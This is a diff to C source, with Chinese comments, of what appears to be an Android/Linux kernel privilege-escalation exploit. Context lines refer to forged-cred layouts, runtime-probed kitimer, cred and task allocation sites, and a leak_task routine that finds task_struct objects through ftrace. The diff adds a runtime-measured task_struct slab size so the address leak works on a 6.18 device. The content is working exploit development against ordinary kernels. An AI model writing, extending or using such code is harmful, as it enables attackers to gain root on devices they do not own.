@@ -73,6 +73,11 @@ static uint64_t SITE_KITIMER_RT, SITE_CRED_RT, SITE_TASK_RT;
 #define STATIC_ANCHOR_TRUSTED (KITIMER_SIZE == 0x108ULL)
 /* call-site of the task_struct slab allocation inside copy_process (0 = unknown) */
 static uint64_t TASK_ALLOC_LINK;
+/* task_struct slab 的 object_size（运行期实测，calib_a 落盘）。
+ * profile 里 BTF 推导的 sizeof(struct task_struct) 偏小：CONFIG_THREAD_SIZE_IN_TSK
+ * 把栈内嵌进 task_struct，真机 6.18 实测 4736(BTF) + 1024(THREAD_SIZE) = 5760。
+ * 所以尺寸窗口以运行期实测值为准，profile 值只当兜底。 */
+static uint64_t TASK_SIZE_RT;
 /*
  * Forged-cred layout (B4): all offsets come from the profile (blob v4) so the
  * empty cred page matches whatever KMI the device runs. android15-8 values:
@@ -138,11 +143,16 @@ static int init_offsets(void) {
     SITE_KITIMER_RT = read_site_file("sites.kitimer");
     SITE_CRED_RT = read_site_file("sites.cred");
     SITE_TASK_RT = read_site_file("sites.task");
+    /* task_struct 的 slab object_size 实测值（没有就退回 profile 的 BTF 值） */
+    TASK_SIZE_RT = read_site_file("task_size.txt");
     if (SITE_KITIMER_RT || SITE_CRED_RT || SITE_TASK_RT)
         dprintf(STDOUT_FILENO,
                 "[config] runtime call sites: kitimer=%#" PRIx64 " cred=%#" PRIx64
                 " task=%#" PRIx64 "\n",
                 SITE_KITIMER_RT, SITE_CRED_RT, SITE_TASK_RT);
+    if (TASK_SIZE_RT)
+        dprintf(STDOUT_FILENO, "[config] task_struct object_size=%#" PRIx64
+                " (profile=%u)\n", TASK_SIZE_RT, TASK_STRUCT_SIZE);
 
     /* forged-cred layout（profile blob v4；老 profile 已由 kernel_table.c 补 6.6 默认值） */
     CRED_PLANT_SIZE = offsets->cred_size;
@@ -1999,12 +2009,26 @@ static void freq_dump(const char *tag, const struct freq *table, int used)
  */
 #define TASK_VENDOR_EXTRA_MAX 0x400U
 
+/*
+ * task_struct slab object_size 的基准值。
+ *
+ * 优先用运行期实测值（calib_a 的分配点探测落盘 task_size.txt）：BTF 的
+ * sizeof(struct task_struct) 只是下界 —— CONFIG_THREAD_SIZE_IN_TSK 把栈内嵌
+ * 进 task_struct，真机 6.18 实测 4736(BTF) + 1024(THREAD_SIZE) = 5760。
+ * 没有实测值时才退回 profile 的值（此时沿用「厂商扩展 ≤ 0x400」的旧窗口）。
+ */
+static uint64_t task_size_base(void)
+{
+	return TASK_SIZE_RT ? TASK_SIZE_RT : (uint64_t)TASK_STRUCT_SIZE;
+}
+
 static int task_size_in_window(uint64_t v)
 {
-	if (!TASK_STRUCT_SIZE)
+	uint64_t base = task_size_base();
+
+	if (!base)
 		return 0;
-	return v >= TASK_STRUCT_SIZE &&
-	       v <= (uint64_t)TASK_STRUCT_SIZE + TASK_VENDOR_EXTRA_MAX;
+	return v >= base && v <= base + TASK_VENDOR_EXTRA_MAX;
 }
 
 static int leak_task(void)
@@ -2126,10 +2150,10 @@ static int leak_task(void)
 	write_file(TRACE "/tracing_on", "0\n");
 	dprintf(STDOUT_FILENO,
 		"[task] hits=%d by_site=%d by_size=%d foreign=%d other=%d task=%#" PRIx64
-		" raw=%zu cpus=%d size=%u..%u want_site=%#" PRIx64
+		" raw=%zu cpus=%d size=%" PRIu64 "..%" PRIu64 " want_site=%#" PRIx64
 		" max_alloc=%" PRIu64 "@%#" PRIx64 "\n",
 		hits, by_site, by_size, foreign, other, g_task, scanned, ncpu,
-		TASK_STRUCT_SIZE, TASK_STRUCT_SIZE + TASK_VENDOR_EXTRA_MAX, want_site,
+		task_size_base(), task_size_base() + TASK_VENDOR_EXTRA_MAX, want_site,
 		max_alloc, max_site);
 	if (!hits) {
 		/* One run must be enough to tell the three failure modes apart:
